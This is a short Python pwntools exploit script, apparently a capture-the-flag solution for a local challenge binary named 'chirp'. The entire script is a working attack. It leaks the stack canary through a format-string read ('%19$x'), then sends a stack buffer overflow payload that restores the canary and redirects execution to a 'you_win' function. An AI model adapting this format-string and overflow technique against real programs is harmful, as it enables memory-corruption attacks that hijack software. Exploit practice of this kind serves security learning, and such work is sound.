#!/usr/bin/env python3
from pwn import *
p = process("./chirp")
elf = context.binary = ELF("./chirp")
win = elf.sym.you_win
p.recvline()
p.sendline("%19$x")
print(p.recvline())
canary  = p.recvline().strip()
log.info("Canary: %s" %(canary.decode()))
offset = 40
print(canary)
payload = b'A'*offset + p64(int(canary,16)) + b'a'*8+ p32(win)
p.recvuntil("***")
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()